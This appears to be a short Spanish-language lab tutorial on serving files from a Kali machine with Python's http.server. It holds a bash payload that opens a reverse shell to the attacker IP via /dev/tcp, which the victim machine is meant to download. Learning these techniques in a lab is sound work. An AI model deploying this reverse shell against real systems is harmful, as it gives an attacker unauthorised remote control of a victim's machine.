# Cómo Compartir Archivos con Servidor Http Con Python + Reverse Shell

- Creamos un Payload basico con el editor nano:
    
    ```bash
    nano payload.sh
    ```
    

![image.png](image%204.png)

- Escribimos el siguiente código que lo que hace básicamente de envió de una Reverse Shell. Guardamos y salimos de nano.
La IP pertenece a la maquina atacante.
    
    ```bash
    #!/bin/bash
    
    sh -i >& /dev/tcp/10.0.3.4/443 0>&1
    ```
    

![image.png](image%205.png)

- Vamos a crear un servidor web con Python.

```bash
python3 -m http.server 80

```

**python3**: **Llama a la versión 3 de Python**.

**-m http.server**: **Invoca el módulo http.server de Python**, que incluye las funcionalidades necesarias para crear un servidor HTTP básico.

**80**: Especifica que el servidor **usará el puerto 80**, el puerto predeterminado para el protocolo HTTP.

![image.png](image%206.png)

- Esto lo que hace es levantar un servidor web en el puerto 80 dentro del actual directorio dentro de la maquina kali.
- Si vamos a la maquina victima y ponemos la IP de la maquina Kali en el navegador accederíamos al directorio donde he creado el servidor web. De tal forma que si le doy un clip al archivo payload.sh lo descargaría.

![image.png](faad3445-f7c7-44b5-a98e-4a045fc997ea.png)